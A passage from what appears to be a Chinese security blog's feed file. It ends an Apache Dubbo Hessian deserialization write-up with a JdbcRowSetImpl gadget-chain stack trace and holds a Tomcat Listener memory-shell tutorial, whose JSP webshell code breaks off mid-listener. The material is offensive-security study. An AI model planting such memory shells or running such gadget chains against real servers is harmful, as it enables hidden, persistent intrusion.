class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">483</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">176</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">readObject:<span class="number">97</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">handleValue:<span class="number">145</span>, DecodeableRpcResult (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">97</span>, DecodeableRpcResult (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">117</span>, DecodeableRpcResult (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:<span class="number">48</span>, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:<span class="number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">waitAndDrain:<span class="number">93</span>, ThreadlessExecutor (org.apache.dubbo.common.threadpool)</span><br><span class="line">get:<span class="number">179</span>, AsyncRpcResult (org.apache.dubbo.rpc)</span><br><span class="line">invoke:<span class="number">61</span>, AsyncToSyncInvoker (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:<span class="number">89</span>, MonitorFilter (org.apache.dubbo.monitor.support)</span><br><span class="line">invoke:<span class="number">81</span>, ProtocolFilterWrapper$<span class="number">1</span> (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:<span class="number">51</span>, FutureFilter (org.apache.dubbo.rpc.protocol.dubbo.filter)</span><br><span class="line">invoke:<span class="number">81</span>, ProtocolFilterWrapper$<span class="number">1</span> (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:<span class="number">55</span>, ConsumerContextFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:<span class="number">81</span>, ProtocolFilterWrapper$<span class="number">1</span> (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:<span class="number">78</span>, ListenerInvokerWrapper (org.apache.dubbo.rpc.listener)</span><br><span class="line">invoke:<span class="number">56</span>, InvokerWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">doInvoke:<span class="number">82</span>, FailoverClusterInvoker (org.apache.dubbo.rpc.cluster.support)</span><br><span class="line">invoke:<span class="number">259</span>, AbstractClusterInvoker (org.apache.dubbo.rpc.cluster.support)</span><br><span class="line">intercept:<span class="number">47</span>, ClusterInterceptor (org.apache.dubbo.rpc.cluster.interceptor)</span><br><span class="line">invoke:<span class="number">92</span>, AbstractCluster$InterceptorInvokerNode (org.apache.dubbo.rpc.cluster.support.wrapper)</span><br><span class="line">invoke:<span class="number">82</span>, MockClusterInvoker (org.apache.dubbo.rpc.cluster.support.wrapper)</span><br><span class="line">invoke:<span class="number">74</span>, InvokerInvocationHandler (org.apache.dubbo.rpc.proxy)</span><br><span class="line">IObject:-<span class="number">1</span>, proxy0 (org.apache.dubbo.common.bytecode)</span><br><span class="line">Hessian_Ser:<span class="number">25</span>, HelloConsumer (com.example.dubboconsumer.consumer)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">483</span>, Method (java.lang.reflect)</span><br><span class="line">doInvoke:<span class="number">205</span>, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeForRequest:<span class="number">150</span>, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeAndHandle:<span class="number">117</span>, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">invokeHandlerMethod:<span class="number">895</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1067</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">963</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">655</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">764</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">541</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">360</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">399</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">890</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1743</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">744</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><h2 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h2><p>参考TCTF2022 Hessian-onlyJdk</p><p>Hessian先到此结束吧。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></li><li><a href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Apache-Dubbo-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2020-1948">https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#Apache-Dubbo-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2020-1948</a></li><li><a href="https://xz.aliyun.com/t/13599?time__1311=GqmxuDc7iQKiqGNDQ0PBKqKhCGCSddYa4D#toc-10">https://xz.aliyun.com/t/13599?time__1311=GqmxuDc7iQKiqGNDQ0PBKqKhCGCSddYa4D#toc-10</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jackson反序列化学习</title>
      <link href="/2025/01/11/WebExploit/Java/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/11/WebExploit/Java/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>占坑</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计项目清单</title>
      <link href="/2025/01/08/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE%E6%B8%85%E5%8D%95/"/>
      <url>/2025/01/08/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0a0085243894268d33d722ceeb12c476e260862a49d7651b66a308ad11a3854f">84bab8aa0845d35c83ef0627e67139dd3d7ce8480f936b087b861ee8da6f7c2454ce07c406e5ecf4cb28acdb125c72e651f3c1f50bfcb298127e00bb4ea1f0d70d5d126f54d1287cf42a688e1b0feb3f3995f8167c434d07e505b19343670077560e1fde031d53df23fb1b4fa2ea65b7f1edb419d10a2e419ef5710e1a97858c174f56c8a7a5d2b0068c43dda986ca57be14b3beab77bd7a66330477dc684dc7dce8dea2071c0db0136be5cd4c85cddf9cc73e119af60fd68a92c1a7f8930cf49f1d31c25fa6f254a4d76d6c181bbe8f3f2e4a32385ea72a6eea0db770ded7cbb5e5ec476a365a30ef646dc2a6947f7d429bd3fcba59c23ae3cb3647d455cc815d458ff7bb414237d11545da81fcca7ebfe0b187b2362300ac431b51c794d69f3324ec1235a323debd58db820185883db129c8a469e25b613c4f89e50ce0b12f043daea97c958cd88781c610c6f67ad60a34ad597ceaeb81cb7ce4ec39ef66dd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Code audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化下注入内存马的打法</title>
      <link href="/2025/01/08/WebExploit/Java/memshell-in-unser/"/>
      <url>/2025/01/08/WebExploit/Java/memshell-in-unser/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fe2c5437715e0b2f1103787e7512263edd01383e5885ccf4f42f8e7ca7f8cf92">84bab8aa0845d35c83ef0627e67139dd3d7ce8480f936b087b861ee8da6f7c2426fe3cbc92023b4d8d80e496ec731aeebc75a34da45908df6839544206de723a05be1d06f3be9b3d55bf61f7df00bc42634bc210849be9e1710604de1bcce30c39e0bb9cc695c839c1d78812ab71470715d8fd3e6feb63bdc3de80ea206021babb0009229e524f0624bb8786b4c792508ef5790f66cb9085dab8ab90115d8976a9d4a79495f53455ccab0803d5e761aff90a2dafe0abe536540e355956d5e920314dff89c8cf80ec83e6d91b8ec1d545e4d4d518e32c81a8686f807836b87975dfb7bbe8bcaf3adcc5034f37911defc955bd134989be0d668261434ca99251cd3c7a06e109df7a73a04fc16e3f871f674f07953222f0e5ab3d2b503ffbcdadc822b1b2bbd157a41e3dcab8668b3ac3db8b0ce175493281b51476dd538c169ae85f9b9a6eca74abcfbe746ed99d8a731ef5fc789b32d81a2fed372dd8bcb3e9bf9c7a138b148ec55b122e2689b454f3f0cb3a1e6e2a978c7a294bb318d05b4e5eddd0aaa0858634416d911ea31090dad7f713d2fda168e99ccda22ad0e04dcd60061cf9e5e7026bdc5d5347b49f5e609a5bb77678cba71ec445d6a14a46f49382ec4e78f62cb176c4c5902a7b668e3daae65359d6174ca9240b1e0c04a8d55ff4a1edcc55c3b2b1ea8d8fd47e2edc0db2b9397a0db92d762bf12a86fe9677eea9873df1e44238e105d052e636c4fea469315f699b95623fd38a436975876aeb00df7624ac3d10bce29fbe3764e3e41f9df550bfa5212e2ca638c459c6ea4dbcd0badc39ab24b7d5d1aa737286ea38298100e55f5d4b090ab2ea53f6db1f056105b0315c311e1c59d094e65f0311687f10131945afa533f08a9463145c53922306</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Listener型内存马</title>
      <link href="/2025/01/05/WebExploit/Java/memshell-Listener/"/>
      <url>/2025/01/05/WebExploit/Java/memshell-Listener/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-Listener型内存马"><a href="#Tomcat-Listener型内存马" class="headerlink" title="Tomcat Listener型内存马"></a>Tomcat Listener型内存马</h1><h2 id="关于Servlet-Listener"><a href="#关于Servlet-Listener" class="headerlink" title="关于Servlet Listener"></a>关于Servlet Listener</h2><p>Listener：顾名思义就是监听Java对象的方法调用或者属性改变，即当发生上述现象时会调用Listener中的对应方法</p><p>Servlet规范中定义8个监听器接口，可用于监听ServletContext、HttpSession、ServletRequest，监听事件分类：</p><ul><li>监听对象创建和变量销毁</li><li>监听对象属性变更</li><li>监听HttpSession中对象状态改变</li></ul><p>以下是一个使用ServletRequestListener的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestListener</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test Listener requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test Listener requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在requestInitialized打断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">requestInitialized:<span class="number">22</span>, TestListener (com.example.memshell)</span><br><span class="line">fireRequestInitEvent:<span class="number">5157</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">116</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">660</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">346</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">388</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">936</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">52</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1190</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">63</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">744</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>看看fireRequestInitEvent，首先是获取应用的所有listener，然后遍历调用requestInitialized（destroy的逻辑也是类似）</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051132904.png" alt="image-20250105113244820"></p><p>看看ApplicationEventListeners中的相关方法，有getter，setter还有一个add，这在写内存马注册监听器有用</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051506890.png" alt="image-20250105150627805"></p><h2 id="获取Request和Response"><a href="#获取Request和Response" class="headerlink" title="获取Request和Response"></a>获取Request和Response</h2><p>request：</p><p>注意到我们在Listener中使用的参数ServletRequestEvent，跟进查看到构造函数，由于多态我们需要在调试时查看类型</p><p>此时的request为RequestFacade类</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051512993.png" alt="image-20250105151256923"></p><p>实现了HttpServletRequest接口，可以直接拿来用了</p><p>注意这里的构造函数，可以继续查看是Request类</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051517781.png" alt="image-20250105151738708"></p><ul><li>reponse</li></ul><p>在Request类中有一个getReponse函数，可以直接拿来用</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051519540.png" alt="image-20250105151918476"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051521783.png" alt="image-20250105152128724"></p><ul><li>总结上述过程为</li></ul><p>其实两者都是 tomcat 内部的对象, 封装了底层的 http 请求, 而 RequestFacade 是 Request 的又一层封装</p><p>下面我们用反射来实现上面获取的过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest(); </span><br><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>); </span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>); </span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade); </span><br><span class="line"><span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br></pre></td></tr></table></figure><p>后面就能直接通过 request 和 response 来正常的接收参数和输出回显</p><h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><p>jsp内存马如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.xml.bind.Unmarshaller&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 standardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctxField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctxField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctxField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctxField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctxField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctxField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建Listener</span></span><br><span class="line">    <span class="comment">// 调试的时候可以发现: ServletRequestListener listener = (ServletRequestListener)instance;</span></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() 